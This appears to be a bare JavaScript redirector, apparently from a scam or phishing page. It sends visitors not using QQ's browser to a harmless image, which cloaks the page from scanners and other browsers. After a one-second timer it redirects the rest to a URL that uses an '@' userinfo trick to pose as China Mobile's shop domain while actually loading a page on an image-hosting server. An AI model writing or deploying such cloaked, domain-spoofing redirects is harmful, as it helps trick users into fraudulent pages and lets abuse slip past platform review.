function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://mmbiz.qpic.cn/mmbiz_png/aT8qzs1muR02Pl45REQGPHHqm5qsRW9p1s0vxQPhedJTHtHBnEdCPr2AJQwib2Tx8uSiaZqSOsz8HmvWb8zq6Ysg/640";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://shop.10086.cn@xwwebimg-75050.picgzc.qpic.cn/1704547584025.htm' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
